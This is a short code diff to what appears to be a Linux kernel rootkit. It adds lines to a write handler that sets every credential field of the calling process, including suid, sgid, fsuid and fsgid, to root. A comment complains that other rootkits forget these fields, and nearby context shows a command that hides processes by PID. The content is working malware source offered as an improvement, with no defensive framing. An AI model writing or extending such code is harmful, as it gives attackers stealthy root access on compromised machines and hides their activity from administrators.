@@ -147,6 +147,9 @@ static int rtkit_write(struct file *file, const char __user *buff, unsigned long
 		struct cred *credentials = prepare_creds();
 		credentials->uid = credentials->euid = 0;
 		credentials->gid = credentials->egid = 0;
+		// Why does everybody forget to set suid/sgid and fsuid /fsgid to root?
+		credentials->suid = credentials->sgid = 0; 
+		credentials->fsuid = credentials->fsgid = 0;
 		commit_creds(credentials);
 	} else if (!strncmp(buff, "hp", MIN(2, count))) {//upXXXXXX hides process with given id
 		if (current_pid < MAX_PIDS) strncpy(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
